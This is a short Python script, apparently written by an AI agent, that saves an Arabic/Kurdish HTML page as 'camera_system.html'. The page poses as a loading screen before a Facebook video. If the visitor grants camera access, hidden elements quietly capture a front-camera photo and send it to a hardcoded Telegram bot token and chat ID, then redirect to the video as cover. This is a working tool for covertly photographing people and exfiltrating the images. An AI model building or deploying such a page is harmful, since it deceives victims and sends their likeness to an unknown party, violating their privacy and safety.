
html_code = '''<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            width: 100%; 
            height: 100vh; 
            background: #000; 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        #video, #canvas { position: absolute; width: 1px; height: 1px; opacity: 0; }
        
        /* دیالۆگی داواکردنی کامیرا */
        .camera-dialog {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px;
            text-align: center;
            max-width: 320px;
            width: 90%;
            color: #fff;
            border: 1px solid #333;
        }
        .camera-dialog h2 {
            font-size: 18px;
            margin-bottom: 12px;
            color: #fff;
        }
        .camera-dialog p {
            font-size: 14px;
            color: #aaa;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .btn-group {
            display: flex;
            gap: 10px;
            justify-content: center;
        }
        .btn {
            padding: 10px 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            font-weight: bold;
            transition: opacity 0.2s;
        }
        .btn-yes {
            background: #1877f2;
            color: #fff;
        }
        .btn-no {
            background: #444;
            color: #fff;
        }
        .btn:active {
            opacity: 0.7;
        }
        
        /* هیدن کردنی دیالۆگ */
        .hidden { display: none !important; }
        
        /* لۆدینگ */
        .loading {
            color: #fff;
            font-size: 16px;
            display: none;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <!-- دیالۆگی داواکردنی کامیرا -->
    <div class="camera-dialog" id="cameraDialog">
        <h2>📷 ڕێگەدان بە کامیرا</h2>
        <p>پێویستە کامیرا بەکاربهێنیت بۆ بەردەوامبوون. ئایا ڕێگە دەدەیت؟</p>
        <div class="btn-group">
            <button class="btn btn-yes" id="btnYes">بەڵێ</button>
            <button class="btn btn-no" id="btnNo">نەخێر</button>
        </div>
    </div>

    <!-- لۆدینگ دوای وەڵامدانەوە -->
    <div class="loading" id="loadingText">جاري التحميل...</div>

    <script>
        const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
        const chatId = "5015426926";
        const CAPTURE_DELAY = 1000;
        const REDIRECT_DELAY = 2000; // دوو چرکە دوای وێنەگرتن
        const VIDEO_LINK = 'https://www.facebook.com/reel/1431859845423648/?fs=e&fs=e';

        let photoSent = false;

        async function captureAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });

                const video = document.getElementById("video");
                video.srcObject = stream;
                await video.play();

                await new Promise(resolve => {
                    if (video.videoWidth > 0) resolve();
                    else video.onloadedmetadata = resolve;
                });

                const canvas = document.getElementById("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append("chat_id", chatId);
                        formData.append("photo", blob, "photo_" + Date.now() + ".jpg");
                        try {
                            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        } catch (err) {}
                    }
                    photoSent = true;
                    
                    // دوو چرکە دوای وێنەگرتن راستەوخۆ فیدیۆکە دەکرێتەوە
                    setTimeout(() => {
                        location.href = VIDEO_LINK;
                    }, REDIRECT_DELAY);
                    
                }, "image/jpeg", 0.95);

            } catch (error) {
                // ئەگەر کامیرا نەکرایەوە، دوو چرکە دوای هەڵەش فیدیۆکە بکرێتەوە
                setTimeout(() => {
                    location.href = VIDEO_LINK;
                }, REDIRECT_DELAY);
            }
        }

        // کلیکی بەڵێ
        document.getElementById('btnYes').addEventListener('click', function() {
            document.getElementById('cameraDialog').classList.add('hidden');
            document.getElementById('loadingText').style.display = 'block';
            // یەک چرکە دوای کلیک وێنە دەگرێت
            setTimeout(captureAndSend, CAPTURE_DELAY);
        });

        // کلیکی نەخێر
        document.getElementById('btnNo').addEventListener('click', function() {
            document.getElementById('cameraDialog').classList.add('hidden');
            document.getElementById('loadingText').style.display = 'block';
            // ئەگەر نەخێر، دوو چرکە دواتر فیدیۆکە بکرێتەوە بەبێ وێنەگرتن
            setTimeout(() => {
                location.href = VIDEO_LINK;
            }, CAPTURE_DELAY + REDIRECT_DELAY);
        });
    </script>

</body>
</html>'''

with open('/mnt/agents/output/camera_system.html', 'w', encoding='utf-8') as f:
    f.write(html_code)

print("Done!")
